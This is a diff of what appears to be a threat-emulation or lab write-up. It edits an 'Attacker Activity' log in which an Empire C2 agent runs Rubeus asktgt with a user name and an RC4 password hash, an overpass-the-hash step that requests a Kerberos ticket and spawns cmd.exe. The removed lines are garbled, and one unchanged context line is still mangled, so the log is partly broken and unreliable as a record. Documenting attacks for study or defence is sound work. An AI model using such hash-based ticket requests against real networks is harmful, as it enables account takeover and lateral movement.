@@ -85,8 +85,7 @@ Shire
 ## Attacker Activity
 
 ```
-(Empire: G6BYHU4F) > 
-c4:b415baa073a14f81f8c89a2a384f4a68 /createnetonly:C:\Windows\System32\cmd.exe
+(Empire: G6BYHU4F) > shell Rubeus.exe asktgt /user:Mmidge /rc4:b415baa073a14f81f8c89a2a384f4a68 /createnetonly:C:\Windows\System32\cmd.exe
 [*] Tasked G6BYHU4F to run TASK_SHELL
 [*] Agent G6BYHU4F tasked with task ID 5.5.exe asktgt /user:Mmidge /d 
 (Empire: G6BYHU4F) > ______        _                      
